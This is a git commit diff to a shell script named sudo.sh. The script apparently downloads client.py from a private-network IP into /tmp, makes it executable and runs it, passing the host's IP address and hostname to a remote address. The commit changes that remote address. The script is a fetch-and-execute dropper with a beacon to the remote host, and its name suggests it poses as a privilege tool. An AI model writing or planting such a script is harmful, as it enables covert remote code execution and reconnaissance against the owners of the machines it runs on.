21c0aa89b19fcd27b14851d0d3789234ba0930d7
Malav Vyas <malavvyas98@gmail.com>
2021-04-30 16:27:43 -0400

    Update sudo.sh

--- sudo.sh
+++ sudo.sh
@@ -5,5 +5,5 @@ if [ ! -f "$FILE" ]; then
 	wget "http://192.168.5.20/client.py" -P /tmp
 	chmod +x /tmp/client.py
 fi
-python3 /tmp/client.py 192.168.15.131 $(echo $(ip a | grep ens160 | grep "inet " | cut -d " " -f6 | cut -d "/" -f1)/$(uname -a | cut -d " " -f2))
+python3 /tmp/client.py 192.168.5.20 $(echo $(ip a | grep ens160 | grep "inet " | cut -d " " -f6 | cut -d "/" -f1)/$(uname -a | cut -d " " -f2))
 
